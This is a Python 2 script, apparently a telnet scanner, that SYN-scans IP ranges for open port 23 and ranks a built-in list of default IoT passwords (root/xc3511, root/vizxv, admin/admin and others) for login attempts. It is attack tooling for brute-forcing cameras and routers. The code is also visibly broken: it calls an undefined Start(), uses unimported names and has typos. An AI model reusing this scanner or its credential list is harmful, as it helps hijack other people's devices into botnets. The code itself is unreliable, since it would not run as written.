#!/usr/bin/env python
#encoding:utf-8

import pexpect
import heapq
import datetime
import time
import Queue
import sys
from collections import deque

import iModule
import iState


try:
    import xml.etree.cElementTree as ET
except ImportError:
    import xml.etree.ElementTree as ET

#this should be a dict
auth_table = [  ("user","password",10),
                ("tech","tech",1),
                ("root","Zte521",2),
                ("root","xc3511",2),
                ("root","vizxv",1),
                ("admin","admin",1),
                ("root","admin",1),
                ("root","888888",1),
                ("root","xmhdipc",1),
                ("root","juantech",1),
                ("root","123456",1),
                ("root","54321",1),
                ("support","support",1),
                ("root","",1),
                ("admin","password",1),
                ("root","root",1),
                ("root","root",1),
                ("user","user",1),
                ("admin","admin1234",1),
                ("admin","smcadmin",1),
                ("root","klv123",1),
                ("root","klv1234",1),
                ("root","hi3518",1),
                ("root","jvbzd",1),
                ("root","anko",1),
                ("root","zlxx.",1),
                ("root","system",1)]

auth_queue = iModule.PriorityQueue()
ip_prompt_queue = deque(maxlen = 100)
queue = Queue.Queue()

def ip2num(ip, bigendian = True):
    ip = [int(x) for x in ip.split('.')]
    return ip[0] << 24 | ip[1] << 16 | ip[2] << 8 | ip[3] & 0xffffffff

def num2ip(num, bigendian = True):
    return '%s.%s.%s.%s' % ((num >> 24) & 0xff, (num >> 16) & 0xff, (num >> 8) & 0xff, num & 0xff)

def choose_ip(ip_pair):
    if len(ip_pair) > 0:
        return choice(ip_pair)
    else:
        return None

def start():
    '''Init threads'''
    scanner_list = []
    start_time = datetime.now()
    send_syn_thread = iModule.send_syn(sys.argv[1])
    state = iModule.SendState()
    try:
        send_syn_thread.start(argv[1], state)
    except:
        print "[Error] Start ip_split failed!"
        sys.exit()

    sniffer_thread = iModule.sniffer(cook)
    try:
        sniffer_thread.daemon = True
        sniffer_thread.start()
    except:
        print "[Error] Start sniffer failed!"
        sys.exit()

    for i in range(int(sys.argv[2])):
        t = iModule.Scanner(state)
        try:
            t.start()
        except:
            pass
        scanner_list.appent(t)

    while True:
        time.sleep(1)
        if time.time() - state.lastRecv > 30 and state.exitFlag == 1:
            state.exitFlag = 2
        elif state.exitFlag == 3:
            end_time = datetime.now()
            print "iScanner completes..."
            print "It totally costs: %d seconds..." % (end_time-start_time).seconds
            break
        
        sys.exit(1)

def cook(pkt):
    try:
        global lastRecv
        lastRecv = time.time()
        if pkt[TCP].flags == 18 and pkt[IP].src not in ip_prompt_queue:
            queue.put(pkt[IP].src)
            print "23 port opened: %s " % (pkt[IP].src)
            ip_prompt_queue.append(pkt[ip].src)
    except:
        pass


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "usage: iScanner.py ip_filename thread_number"
        print "example :iScanner.py ip_filename 20"
        sys.exit(1)
    
    for item in auth_table:
        auth_queue.push(item[0:2], item[-1])
        
    Start()